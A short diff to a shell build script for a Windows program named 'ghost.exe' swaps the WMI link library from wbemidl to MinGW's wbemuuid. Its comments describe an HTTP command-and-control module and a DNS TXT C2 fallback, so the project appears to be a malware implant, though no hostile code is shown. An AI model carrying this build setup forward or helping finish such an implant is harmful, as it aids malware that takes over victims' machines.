@@ -100,7 +100,7 @@ fi
 #   advapi32    — Registry (RegOpenKey*), token (OpenProcessToken), crypto
 #   ole32       — COM runtime (CoInitialize, CoCreateInstance) — WMI
 #   oleaut32    — BSTR/VARIANT helpers (_bstr_t, _variant_t) — WMI
-#   wbemidl     — WMI IWbemLocator / IWbemServices interfaces
+#   wbemuuid    — WMI IWbemLocator / IWbemServices interfaces (MinGW name for wbemidl)
 #   bcrypt      — AES-256-GCM, SHA-256, BCryptGenRandom (utils.cpp)
 #   winhttp     — WinHttpOpen / WinHttpConnect / WinHttpSendRequest (c2.cpp)
 #   dnsapi      — DnsQuery — DNS TXT C2 fallback (c2.cpp)
@@ -124,7 +124,7 @@ echo "[*] Compiling ghost.exe..."
     -ladvapi32           \
     -lole32              \
     -loleaut32           \
-    -lwbemidl            \
+    -lwbemuuid           \
     -lbcrypt             \
     -lwinhttp            \
     -ldnsapi             \
